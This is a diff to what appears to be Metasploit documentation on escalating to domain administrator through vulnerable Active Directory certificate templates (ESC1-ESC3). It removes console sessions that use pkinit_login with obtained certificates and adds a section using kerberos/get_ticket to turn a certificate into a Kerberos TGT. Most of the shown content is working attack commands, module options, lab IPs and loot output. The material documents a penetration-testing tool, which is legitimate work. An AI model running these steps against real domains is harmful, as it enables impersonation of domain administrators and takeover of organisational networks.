@@ -344,60 +344,10 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
-We can then use the `pkinit_login` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator` domain administrator:
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
+domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
 
-```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/kerberos/pkinit_login
-msf6 auxiliary(admin/kerberos/pkinit_login) > show options
-
-Module options (auxiliary/admin/kerberos/pkinit_login):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   CERT_FILE                   yes       File containing a certificate (*.pfx) to authenticate with
-   CERT_PASS                   no        Password for the Certificate file
-   DOMAIN                      no        Override domain in certificate file
-   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
-                                         wiki/Using-Metasploit
-   RPORT      88               yes       The target port
-   Timeout    10               yes       The TCP timeout to establish connection and read data
-   USERNAME                    no        Override username in certificate file
-
-
-View the full module info with the info, or info -d command.
-
-msf6 auxiliary(admin/kerberos/pkinit_login) > set CERT_FILE /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
-CERT_FILE => /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
-msf6 auxiliary(admin/kerberos/pkinit_login) > set RHOSTS 172.30.239.85
-RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/kerberos/pkinit_login) > run
-[*] Running module against 172.30.239.85
-
-[*] Attempting PKINIT login for Administrator@daforest.com
-[+] Successfully authenticated with certificate
-[*] 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/gwillcox/.msf4/loot/20221216143858_default_172.30.239.85_mit.kerberos.cca_391796.bin
-[*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/pkinit_login) > loot
-
-Loot
-====
-
-host           service  type                 name             content                   info                                                                     path
-----           -------  ----                 ----             -------                   ----                                                                     ----
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
-172.30.239.85           mit.kerberos.ccache                   application/octet-stream  realm: DAFOREST.COM, client: administrator, server: krbtgt/daforest.com  /home/gwillcox/.msf4/loot/20221216143858_default_172.30.239.85_mit.kerberos.cca_391796.bin
-
-msf6 auxiliary(admin/kerberos/pkinit_login) >
-```
-
-We now have a TGT at:
-```
-/home/gwillcox/.msf4/loot/20221216142717_default_172.30.239.85_mit.kerberos.cca_057480.bin
-```
-This can be used to authenticate to the `daforest.com` domain as the `Administrator` domain administrator user.
-The user that we have gotten the certificate as can be confirmed by the `client` field in the `loot` command's output, and we can confirm the domain as well by looking at the `realm` field in the same output.
-
-## Exploiting ESC2 To Gain Domain Adminstrator Privileges
+# Exploiting ESC2 To Gain Domain Administrator Privileges
 From the previous enumeration efforts we know that the following certificate templates are vulnerable to ESC2:
 - SubCA - Not exploitable as you have to be a Domain Admin or Enterprise Admin to enroll in this certificate
 - ESC2-Template - Enrollable by any authenticated user that is part of the Domain Users group, aka any authenticated domain user.
@@ -567,48 +517,10 @@ host  service  type           name             content               info       
 msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
-Finally we can use the `pkinit_login` module to log in to the domain as `Administrator@daforest.com` using the new PFX file:
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
+domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
 
-```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use pkinit_login
-
-Matching Modules
-================
-
-   #  Name                                   Disclosure Date  Rank    Check  Description
-   -  ----                                   ---------------  ----    -----  -----------
-   0  auxiliary/admin/kerberos/pkinit_login                   normal  No     Kerberos Authentication Check Scanner
-
-
-Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/kerberos/pkinit_login
-
-[*] Using auxiliary/admin/kerberos/pkinit_login
-msf6 auxiliary(admin/kerberos/pkinit_login) > set RHOSTS 172.30.239.85
-RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/kerberos/pkinit_login) > set CERT_FILE /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
-CERT_FILE => /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
-msf6 auxiliary(admin/kerberos/pkinit_login) > run
-[*] Running module against 172.30.239.85
-
-[*] Attempting PKINIT login for Administrator@daforest.com
-[+] Successfully authenticated with certificate
-[*] 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/gwillcox/.msf4/loot/20221216155910_default_172.30.239.85_mit.kerberos.cca_300840.bin
-[*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/pkinit_login) > loot
-
-Loot
-====
-
-host           service  type                 name             content                   info                                                                     path
-----           -------  ----                 ----             -------                   ----                                                                     ----
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
-172.30.239.85           mit.kerberos.ccache                   application/octet-stream  realm: DAFOREST.COM, client: administrator, server: krbtgt/daforest.com  /home/gwillcox/.msf4/loot/20221216155910_default_172.30.239.85_mit.kerberos.cca_300840.bin
-
-msf6 auxiliary(admin/kerberos/pkinit_login) >
-```
-
-## Exploiting ESC3 To Gain Domain Administrator Privileges
+# Exploiting ESC3 To Gain Domain Administrator Privileges
 To exploit ESC3 vulnerable templates we will use a similar process to ESC2 templates but with slightly different steps. First, lets return to the earlier output where we can find several templates that are vulnerable to ESC3 attacks. However we need to split them by attack vector. The reason is that the first half of this attack needs to use the ESC3_TEMPLATE_1 vulnerable certificate templates to enroll in a certificate template that has the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) that allows one to request certificates on behalf of other principals (such as users or computers).
 
 The second part of this attack will then require that we co-sign requests for another certificate using the certificate that we just got, to then request a certificate that can authenticate to the domain on behalf of another user. To do this we will need to look for certificates in the `ldap_esc_vulnerable_cert_finder` module which are labeled as being vulnerable to the ESC3_TEMPLATE_2 attack.
@@ -798,33 +710,49 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 msf6 auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
-Finally lets use the new PFX file with the `pkinit_login` to log in as the domain administrator user `Administrator@daforest.com`:
+We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
+domain administrator. See the [Getting A Kerberos Ticket](#getting-a-kerberos-ticket) section for more information.
+
+# Getting A Kerberos Ticket
+Once a certificate for a user has been claimed, that certificate can be used to issue a Kerberos ticket granting ticket
+(TGT) which in tern can be used to authenticate to services.
+
+Ticket granting tickets can be requested using the [[kerberos/get_ticket|kerberos/get_ticket.md]] module by specifying
+the `CERT_FILE` option. Take the certificate file from the last stage of the attack and set it as the `CERT_FILE`.
+Certificates from Metasploit do not require a password, but if the certificate was generated from a source that added
+one, it can be specified in the `CERT_PASSWORD` option. Set the `RHOST` datastore option to the Domain Controller, then
+run the `GET_TGT` action.
 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/kerberos/pkinit_login
-msf6 auxiliary(admin/kerberos/pkinit_login) > set RHOSTS 172.30.239.85
-RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/kerberos/pkinit_login) > set CERT_FILE /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
-CERT_FILE => /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
-msf6 auxiliary(admin/kerberos/pkinit_login) > run
-[*] Running module against 172.30.239.85
+msf6 > use kerberos/get_ticket
 
-[*] Attempting PKINIT login for Administrator@daforest.com
-[+] Successfully authenticated with certificate
-[*] 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/gwillcox/.msf4/loot/20221216181438_default_172.30.239.85_mit.kerberos.cca_460041.bin
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  auxiliary/admin/kerberos/get_ticket                   normal  No     Kerberos TGT/TGS Ticket Requester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/kerberos/get_ticket
+
+[*] Using auxiliary/admin/kerberos/get_ticket
+msf6 auxiliary(admin/kerberos/get_ticket) > get_tgt rhosts=192.168.159.10 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_192.168.159.10_windows.ad.cs_287833.pfx
+[*] Running module against 192.168.159.10
+
+[*] 192.168.159.10:88 - Getting TGT for smcintyre@msflab.local
+[+] 192.168.159.10:88 - Received a valid TGT-Response
+[*] 192.168.159.10:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230124202354_default_192.168.159.10_mit.kerberos.cca_566767.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/pkinit_login) > loot
+msf6 auxiliary(admin/kerberos/get_ticket) > klist
+Kerberos Cache
+==============
+host            principal               sname                             issued                     status  path
+----            ---------               -----                             ------                     ------  ----
+192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-01-24 20:23:54 -0500  valid   /home/smcintyre/.msf4/loot/20230124202354_default_192.168.159.10_mit.kerberos.cca_566767.bin
 
-Loot
-====
-
-host           service  type                 name             content                   info                                                                     path
-----           -------  ----                 ----             -------                   ----                                                                     ----
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216173718_default_unknown_windows.ad.cs_580032.pfx
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216174559_default_unknown_windows.ad.cs_570105.pfx
-                        windows.ad.cs        certificate.pfx  application/x-pkcs12      DAFOREST\normal Certificate                                              /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
-172.30.239.85           mit.kerberos.ccache                   application/octet-stream  realm: DAFOREST.COM, client: administrator, server: krbtgt/daforest.com  /home/gwillcox/.msf4/loot/20221216181438_default_172.30.239.85_mit.kerberos.cca_460041.bin
-
-msf6 auxiliary(admin/kerberos/pkinit_login) >
+msf6 auxiliary(admin/kerberos/get_ticket) >
 ```
+
+Once the TGT has been issued, it can be seen in the output of the `klist` command. With the TGT saved, it will
+automatically be used in the future to request ticket granting services (TGS) for authentication to specific services.
